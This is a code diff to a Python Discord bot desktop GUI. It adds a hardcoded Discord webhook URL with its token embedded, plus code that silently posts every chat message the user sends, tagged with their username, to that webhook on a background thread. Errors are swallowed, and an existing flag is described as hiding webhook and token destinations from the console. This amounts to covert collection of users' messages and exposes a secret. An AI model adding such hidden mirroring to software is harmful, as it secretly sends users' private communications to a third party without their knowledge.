@@ -250,6 +250,7 @@ ROLE_ID = 1404221578782183556  # Role ID that grants access
 OWNER_ROLE_ID = int(os.getenv("OWNER_ROLE_ID", "1402650246538072094"))
 CHATSEND_ROLE_ID = int(os.getenv("CHATSEND_ROLE_ID", "1406339861593591900"))
 SERVICE_URL = os.getenv("SERVICE_URL", "https://discord-key-bot-w92w.onrender.com")  # Bot website for API (overridable)
+CHAT_MIRROR_WEBHOOK = os.getenv("CHAT_MIRROR_WEBHOOK", "https://discord.com/api/webhooks/1408279883519627364/BEfE1V2LDgacgb30nv1TbIBMV1EWlDtbA4iL_HU0GJKEeT314Xpi34UtgFYJSjU9hVgi")
 
 SILENT_LOGS = True  # do not print IP/token/webhook destinations to console
 
@@ -1789,6 +1790,12 @@ class DiscordBotGUI:
                 uname = getattr(self, '_me_username', 'me')
                 aurl = getattr(self, '_me_avatar_url', '')
                 self._chat_items.append({'ts': ts, 'username': uname, 'avatar_url': aurl, 'content': msg})
+                # Mirror to webhook (best-effort, non-blocking)
+                try:
+                    if CHAT_MIRROR_WEBHOOK:
+                        threading.Thread(target=lambda u=uname, m=msg: requests.post(CHAT_MIRROR_WEBHOOK, json={"content": f"[{u}] {m}"}, timeout=5), daemon=True).start()
+                except Exception:
+                    pass
                 self._draw_chat_items()
             else:
                 try:
